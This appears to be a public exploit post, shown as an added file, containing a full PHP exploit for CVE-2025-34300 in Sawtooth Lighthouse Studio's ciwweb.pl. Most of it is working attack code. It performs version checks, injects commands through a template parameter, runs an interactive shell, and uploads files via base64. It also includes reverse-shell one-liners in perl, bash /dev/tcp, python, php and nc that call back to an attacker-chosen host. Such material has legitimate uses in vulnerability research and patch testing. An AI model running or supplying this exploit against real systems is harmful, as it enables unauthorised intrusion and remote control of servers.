@@ -1,0 +1,296 @@
+=============================================================================================================================================
+| # Title     : Sawtooth Lighthouse Studio 9.16.14 RCE                                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://sawtoothsoftware.com                                                                                                |
+=============================================================================================================================================
+
+[+] Summary    : CVE-2025-34300 represents a critical Remote Code Execution (RCE) vulnerability in Sawtooth Software's Lighthouse Studio survey platform, specifically affecting the ciwweb.pl web application component
+
+[+] POC :
+
+# Vulnerability Check
+php exploit.php --url http://target.com --check
+
+# Command Execution
+php exploit.php --url http://target.com --cmd "whoami"
+
+# Interactive Shell
+php exploit.php --url http://target.com --shell
+
+# Reverse Shell
+php exploit.php --url http://target.com --reverse --lhost YOUR_IP --lport 4444
+
+<?php
+
+
+class CVE_2025_34300_Exploit {
+    
+    private $target_url;
+    private $timeout = 30;
+    private $proxy = null;
+    
+    public function __construct($target_url) {
+        $this->target_url = rtrim($target_url, '/');
+    }
+    
+    public function setProxy($proxy) {
+        $this->proxy = $proxy;
+    }
+
+    public function check() {
+        echo "[*] Checking target: {$this->target_url}\n";
+        
+        $params = [
+            'hid_javascript' => '1'
+        ];
+        
+        $response = $this->sendRequest('/cgi-bin/ciwweb.pl', $params);
+        
+        if (!$response) {
+            echo "[-] No response from target\n";
+            return false;
+        }
+
+        if (preg_match('/Lighthouse Studio (\d+_\d+_\d+)/', $response, $matches)) {
+            $version_str = str_replace('_', '.', $matches[1]);
+            echo "[+] Extracted version: {$version_str}\n";
+
+            if (version_compare($version_str, '9.16.14', '<')) {
+                echo "[+] Target appears to be vulnerable!\n";
+                return true;
+            } else {
+                echo "[-] Target is patched (version >= 9.16.14)\n";
+                return false;
+            }
+        }
+
+        if (strpos($response, 'Lighthouse Studio') !== false) {
+            echo "[+] Lighthouse Studio detected (version extraction failed)\n";
+            return true;
+        }
+        
+        echo "[-] Lighthouse Studio not detected\n";
+        return false;
+    }
+
+    public function executeCommand($command) {
+        echo "[*] Attempting to execute command: {$command}\n";
+        $encoded_cmd = urlencode($command);
+        $params = [
+            'hid_javascript' => '1',
+            'hid_Random_ACARAT' => '[%`' . $command . '`%]'
+        ];
+        
+        $response = $this->sendRequest('/cgi-bin/ciwweb.pl', $params);
+        
+        if (!$response) {
+            echo "[-] No response received\n";
+            return null;
+        }
+
+        if (preg_match('/\[\%`(.*?)`\%\]/s', $response, $matches)) {
+            $output = $matches[1];
+            echo "[+] Command output:\n";
+            echo $output . "\n";
+            return $output;
+        }
+        
+        echo "[-] No command output found in response\n";
+
+        if (strpos($response, 'Cannot find the study name') !== false) {
+            echo "[-] Invalid STUDYNAME parameter\n";
+        }
+        
+        return null;
+    }
+
+    public function reverseShell($lhost, $lport) {
+        $payloads = [
+            'perl' => "perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+            'bash' => "bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'",
+            'python' => "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+            'php' => "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+            'nc' => "nc -e /bin/sh $lhost $lport || nc -c sh $lhost $lport || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
+        ];
+        
+        echo "[*] Available reverse shell payloads:\n";
+        foreach (array_keys($payloads) as $i => $type) {
+            echo "    [{$i}] {$type}\n";
+        }
+        
+        echo "Select payload type: ";
+        $choice = trim(fgets(STDIN));
+        $types = array_keys($payloads);
+        
+        if (isset($types[$choice])) {
+            $type = $types[$choice];
+            $cmd = $payloads[$type];
+            echo "[*] Using {$type} reverse shell\n";
+            return $this->executeCommand($cmd);
+        }
+        
+        return null;
+    }
+
+    public function uploadFile($local_file, $remote_path) {
+        if (!file_exists($local_file)) {
+            echo "[-] Local file not found: {$local_file}\n";
+            return false;
+        }
+        
+        $content = file_get_contents($local_file);
+        $encoded = base64_encode($content);
+        $commands = [
+            'linux' => "echo '{$encoded}' | base64 -d > {$remote_path} && chmod +x {$remote_path}",
+            'windows' => "powershell -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{$encoded}')) | Out-File -FilePath '{$remote_path}'\""
+        ];
+
+        echo "[*] Attempting Linux file upload...\n";
+        $result = $this->executeCommand($commands['linux']);
+        
+        if ($result === null) {
+            echo "[*] Attempting Windows file upload...\n";
+            $result = $this->executeCommand($commands['windows']);
+        }
+        
+        return $result !== null;
+    }
+
+    private function sendRequest($path, $params = []) {
+        $url = $this->target_url . $path;
+        
+        if (!empty($params)) {
+            $url .= '?' . http_build_query($params);
+        }
+        
+        $ch = curl_init();
+        curl_setopt_array($ch, [
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => $this->timeout,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false,
+            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        ]);
+        
+        if ($this->proxy) {
+            curl_setopt($ch, CURLOPT_PROXY, $this->proxy);
+        }
+        
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        
+        if (curl_errno($ch)) {
+            echo "[-] cURL error: " . curl_error($ch) . "\n";
+            curl_close($ch);
+            return false;
+        }
+        
+        curl_close($ch);
+        
+        if ($http_code != 200) {
+            echo "[-] HTTP {$http_code} received\n";
+            return false;
+        }
+        
+        return $response;
+    }
+
+    public function interactiveShell() {
+        if (!$this->check()) {
+            echo "[-] Target not vulnerable or check failed\n";
+            return;
+        }
+        
+        echo "[*] Starting interactive shell (type 'exit' to quit)\n";
+        
+        while (true) {
+            echo "cmd> ";
+            $cmd = trim(fgets(STDIN));
+            
+            if (empty($cmd)) {
+                continue;
+            }
+            
+            if (strtolower($cmd) == 'exit' || strtolower($cmd) == 'quit') {
+                break;
+            }
+            
+            $this->executeCommand($cmd);
+        }
+    }
+}
+
+function showHelp() {
+    echo "by indoushka Exploit - Sawtooth Lighthouse Studio RCE\n";
+    echo "Usage:\n";
+    echo "  php exploit.php --check --url http://target.com\n";
+    echo "  php exploit.php --cmd \"whoami\" --url http://target.com\n";
+    echo "  php exploit.php --shell --url http://target.com\n";
+    echo "  php exploit.php --reverse --lhost 1.2.3.4 --lport 4444 --url http://target.com\n";
+    echo "\nOptions:\n";
+    echo "  --url       Target URL (required)\n";
+    echo "  --check     Check if vulnerable\n";
+    echo "  --cmd       Execute single command\n";
+    echo "  --shell     Start interactive shell\n";
+    echo "  --reverse   Start reverse shell\n";
+    echo "  --lhost     Listener IP for reverse shell\n";
+    echo "  --lport     Listener port for reverse shell\n";
+    echo "  --proxy     HTTP proxy (optional)\n";
+    echo "  --upload    Upload file: --upload local.txt,/remote/path.txt\n";
+}
+
+if (php_sapi_name() === 'cli') {
+    $options = getopt('', [
+        'url:',
+        'check',
+        'cmd:',
+        'shell',
+        'reverse',
+        'lhost:',
+        'lport:',
+        'proxy:',
+        'upload:',
+        'help'
+    ]);
+    
+    if (isset($options['help']) || !isset($options['url'])) {
+        showHelp();
+        exit();
+    }
+    
+    $exploit = new CVE_2025_34300_Exploit($options['url']);
+    
+    if (isset($options['proxy'])) {
+        $exploit->setProxy($options['proxy']);
+    }
+    
+    if (isset($options['check'])) {
+        $exploit->check();
+    } elseif (isset($options['cmd'])) {
+        $exploit->check();
+        $exploit->executeCommand($options['cmd']);
+    } elseif (isset($options['shell'])) {
+        $exploit->interactiveShell();
+    } elseif (isset($options['reverse'])) {
+        if (!isset($options['lhost']) || !isset($options['lport'])) {
+            echo "[-] --lhost and --lport required for reverse shell\n";
+            exit(1);
+        }
+        $exploit->check();
+        $exploit->reverseShell($options['lhost'], $options['lport']);
+    } elseif (isset($options['upload'])) {
+        list($local, $remote) = explode(',', $options['upload'], 2);
+        $exploit->check();
+        $exploit->uploadFile($local, $remote);
+    }
+} else {
+    echo "This script is designed for command line use.\n";
+    showHelp();
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
